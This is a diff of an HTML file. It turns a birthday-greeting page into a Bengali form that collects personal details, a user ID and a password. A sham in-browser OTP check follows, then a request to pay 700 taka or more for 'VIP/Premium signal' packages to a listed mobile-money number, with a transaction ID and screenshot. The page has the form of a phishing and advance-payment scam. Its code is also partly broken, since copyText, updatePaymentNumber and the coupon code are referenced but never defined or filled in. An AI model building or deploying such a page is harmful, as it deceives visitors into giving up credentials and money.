@@ -1,212 +1,187 @@
+ 
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎉 Happy Birthday, Dear Friend! 🎂</title>
-    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <title>ডাটা কালেকশন এবং পেমেন্ট যাচাই</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
     <style>
+        /* প্রিমিয়াম ব্যাকগ্রাউন্ড ও কালার গ্রেডিং */
         body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(45deg, #ff66b2, #ff99cc, #ffccff);
-            height: 100vh;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
+            font-family: Arial, sans-serif;
             text-align: center;
-            position: relative;
-            margin: 0;
-            padding: 0;
-        }
-
-        h1 {
-            font-size: 3em;
-            font-family: 'Pacifico', cursive;
-            color: #FF0066;
-            text-shadow: 0 0 10px #FF0066, 0 0 20px #FF33CC;
-            animation: glow 1.5s infinite alternate;
-            margin-bottom: 20px;
-            white-space: nowrap;
-            overflow: hidden;
-            border-right: 3px solid #FF0066;
-            width: 0;
-            animation: typing 4s steps(40) forwards, glow 1.5s infinite alternate;
-        }
-
-        @keyframes glow {
-            from { text-shadow: 0 0 10px #FF0066; }
-            to { text-shadow: 0 0 20px #FF33CC; }
-        }
-
-        @keyframes typing {
-            to { width: 100%; }
-        }
-
-        .btn {
-            background: linear-gradient(90deg, #ff0066, #ff3399);
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
             color: white;
-            padding: 15px 30px;
-            font-size: 18px;
-            border: none;
-            cursor: pointer;
-            border-radius: 50px;
-            transition: 0.3s;
-            box-shadow: 0 0 10px rgba(255, 0, 102, 0.7);
-        }
-
-        .btn:hover {
-            background: linear-gradient(90deg, #ff3399, #ff6699);
-            box-shadow: 0 0 15px rgba(255, 0, 102, 1);
-        }
-
-        #wishBox {
-            display: none;
-            opacity: 0;
-            transform: scale(0.8);
-            transition: all 0.8s ease-in-out;
-            color: white;
-            background: rgba(255, 0, 102, 0.9);
-            border-radius: 20px;
             padding: 20px;
-            margin-top: 20px;
-            box-shadow: 0 0 15px rgba(255, 0, 102, 0.5);
-            max-width: 600px;
-            width: 90%;
-            margin: 20px auto;
-            z-index: 2;  /* Bring this div to the front */
+            animation: backgroundAnimation 10s infinite alternate;
         }
 
-        .wish-text {
-            font-size: 1.5em;
-            margin-bottom: 20px;
+        @keyframes backgroundAnimation {
+            0% { background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); }
+            100% { background: linear-gradient(135deg, #fdbb2d, #b21f1f, #1a2a6c); }
         }
 
-        .image-container {
+        /* লোডিং স্ক্রীন */
+        #loading {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #ff7e5f, #feb47b);
             display: flex;
-            justify-content: center;
             align-items: center;
-            flex-direction: column;
-        }
-
-        .birthday-image, .birthday-gif {
-            width: 50%;
-            max-width: 150px;
-            margin-top: 20px;
-            border-radius: 20px;
-            box-shadow: 0 0 10px white;
-        }
-
-        .footer {
-            margin-top: 20px;
-            font-size: 1.2em;
+            justify-content: center;
+            font-size: 24px;
             color: white;
             font-weight: bold;
-            text-shadow: 0 0 10px white;
+            z-index: 9999;
         }
 
-        .gift-message {
-            display: none;
-            background-color: rgba(255, 0, 102, 0.8);
-            padding: 15px;
+        /* ফর্মের ডিজাইন */
+        .container {
+            max-width: 450px;
+            margin: auto;
+            background: rgba(0, 0, 0, 0.9);
+            padding: 20px;
             border-radius: 15px;
-            color: white;
-            font-size: 1.3em;
-            margin-top: 15px;
-            z-index: 3; /* Ensure the gift message appears above the other content */
+            box-shadow: 0px 0px 20px rgba(255, 255, 255, 0.5);
         }
 
-        .gift-btn {
-            background: linear-gradient(90deg, #ff0066, #ff3399);
-            color: white;
-            padding: 10px 20px;
-            font-size: 16px;
+        input, select, button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
             border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+        }
+
+        button {
+            background: #ff6b6b;
+            color: white;
             cursor: pointer;
-            border-radius: 25px;
             transition: 0.3s;
-            box-shadow: 0 0 10px rgba(255, 0, 102, 0.7);
-            margin-top: 10px;
         }
 
-        .gift-btn:hover {
-            background: linear-gradient(90deg, #ff3399, #ff6699);
-            box-shadow: 0 0 15px rgba(255, 0, 102, 1);
+        button:hover {
+            background: #ff4757;
         }
 
-        @media (max-width: 768px) {
-            h1 {
-                font-size: 1.5em;
-            }
+        .hidden {
+            display: none;
+        }
 
-            .btn {
-                font-size: 16px;
-                padding: 10px 20px;
-            }
-
-            .wish-text {
-                font-size: 1.2em;
-            }
-
-            .birthday-image, .birthday-gif {
-                width: 90%;
-            }
-
-            .gift-btn {
-                font-size: 1.2em;
-            }
+        .copy-btn {
+            background: transparent;
+            border: none;
+            color: white;
+            cursor: pointer;
+            font-size: 18px;
         }
     </style>
 </head>
-<body>
+<body onload="setTimeout(removeLoading, 5000)">
 
-    <h1>🎉 Happy Birthday, Dear Fokinii😁</h1>
+    <div id="loading">🔄 লোড হচ্ছে...</div>
 
-    <button onclick="showWish()" id="surpriseBtn" class="btn">🎁 Click Here for a Surprise! 🎁</button>
-
-    <div id="wishBox">
-        <p class="wish-text"><br><br><b>✨ May your special day be filled with joy, love, and happiness! ✨</b></p>
-        
-        <div class="image-container">
-            <img class="birthday-image" src="https://assets.onecompiler.app/42weepxyg/43bcjxryh/1000198466_edited.jpeg" alt="Birthday Image">
-            <img class="birthday-gif" src="https://assets.onecompiler.app/42weepxyg/43bcjxryh/happy-birthday-birthday.gif" alt="Birthday GIF">
+    <div class="container">
+        <h2>তথ্য পূরণ করুন</h2>
+        <div id="step1">
+            <input type="text" id="name" placeholder="নাম লিখুন">
+            <input type="email" id="email" placeholder="yourname@gmail.com">
+            <input type="tel" id="phone" placeholder="+880XXXXXXXXXX">
+            <input type="text" id="telegram" placeholder="টেলিগ্রাম আইডি (+880XXXXXXXXXX)">
+            <button onclick="nextStep(1)">পরবর্তী ধাপ</button>
         </div>
-        
-        <!-- Gift message section -->
-        <div id="giftMessage" class="gift-message"><b>🎁 আগে ট্রিট টা দে পরে Gift দিবো 😁</b></div>
-        <button onclick="showGiftMessage()" class="gift-btn"><b>🎁 Give the Gift 🎁</b></button>
+
+        <div id="step2" class="hidden">
+            <h3>একাউন্ট ইনফো</h3>
+            <input type="text" id="userId" placeholder="১০ সংখ্যার ইউজার আইডি">
+            <input type="password" id="password" placeholder="পাসওয়ার্ড (৮ সংখ্যা, বড়-ছোট-প্রতীক)">
+            <button onclick="nextStep(2)">OTP জেনারেট করুন</button>
+        </div>
+
+        <div id="step3" class="hidden">
+            <h3>OTP যাচাই</h3>
+            <button onclick="generateOTP()">OTP তৈরি করুন</button>
+            <p id="otpMessage"></p>
+            <input type="text" id="otpInput" placeholder="OTP দিন">
+            <button onclick="verifyOTP()">যাচাই করুন</button>
+        </div>
+
+        <div id="step4" class="hidden">
+            <h3>পেমেন্ট অপশন</h3>
+            <select id="package" onchange="calculatePayment()">
+                <option value="free">Free (সীমিত সুবিধা)</option>
+                <option value="vip">VIP (+500৳, দৈনিক ১০+ সিগনাল)</option>
+                <option value="premium">Premium (+750৳, আনলিমিটেড সিগনাল)</option>
+            </select>
+            <p>মোট টাকা: <span id="totalAmount">700</span>৳</p>
+
+            <select id="paymentMethod" onchange="updatePaymentNumber()">
+                <option value="bkash">বিকাশ</option>
+                <option value="nagad">নগদ</option>
+                <option value="rocket">রকেট</option>
+                <option value="upay">উপায়</option>
+            </select>
+
+            <p>নম্বর: <span id="paymentNumber">01318645435</span> 
+                <button class="copy-btn" onclick="copyText('paymentNumber')">
+                    <i class="material-icons">content_copy</i>
+                </button>
+            </p>
+
+            <h3>পেমেন্ট যাচাই</h3>
+            <input type="text" id="transactionId" placeholder="ট্রানজেকশন আইডি">
+            <input type="file" id="paymentScreenshot">
+            <button onclick="nextStep(4)">কুপন কোড নিন</button>
+        </div>
+
+        <div id="step5" class="hidden">
+            <h3>আপনার কুপন কোড</h3>
+            <p><span id="couponCode"></span> 
+                <button class="copy-btn" onclick="copyText('couponCode')">
+                    <i class="material-icons">content_copy</i>
+                </button>
+            </p>
+        </div>
     </div>
 
-    <p class="footer">🎁 Made with love by <b>Ayman Hasan Shaan</b> 🎁</p>
-
-    <!-- Birthday Audio -->
-    <audio id="birthdayAudio" autoplay loop>
-        <source src="https://www.myinstants.com/media/sounds/happy-birthday-to-you.mp3" type="audio/mp3">
-        Your browser does not support the audio element.
-    </audio>
-
     <script>
-        function showWish() {
-            let wishBox = document.getElementById("wishBox");
-            let surpriseBtn = document.getElementById("surpriseBtn");
-
-            surpriseBtn.style.display = "none";
-            wishBox.style.display = "block";
-            setTimeout(() => {
-                wishBox.style.opacity = "1";
-                wishBox.style.transform = "scale(1)";
-            }, 100);
-
-            // Play the birthday song audio
-            let audio = document.getElementById('birthdayAudio');
-            audio.play();
+        function removeLoading() {
+            document.getElementById("loading").style.display = "none";
         }
 
-        function showGiftMessage() {
-            let giftMessage = document.getElementById("giftMessage");
-            giftMessage.style.display = "block";
+        function nextStep(currentStep) {
+            document.getElementById("step" + currentStep).classList.add("hidden");
+            document.getElementById("step" + (currentStep + 1)).classList.remove("hidden");
+        }
+
+        function generateOTP() {
+            let otp = Math.random().toString(36).substring(2, 10).toUpperCase();
+            document.getElementById("otpMessage").innerHTML = `আপনার OTP: <b>${otp}</b> <button onclick="copyText('${otp}')">📋 কপি করুন</button>`;
+            sessionStorage.setItem("generatedOTP", otp);
+        }
+
+        function verifyOTP() {
+            let enteredOTP = document.getElementById("otpInput").value;
+            let correctOTP = sessionStorage.getItem("generatedOTP");
+            if (enteredOTP === correctOTP) {
+                alert("✅ OTP সফলভাবে যাচাই হয়েছে!");
+                nextStep(3);
+            } else {
+                alert("❌ ভুল OTP, আবার চেষ্টা করুন!");
+            }
+        }
+
+        function calculatePayment() {
+            let package = document.getElementById("package").value;
+            let price = 700;
+            if (package === "vip") price += 500;
+            else if (package === "premium") price += 750;
+            document.getElementById("totalAmount").innerText = price;
         }
     </script>
 
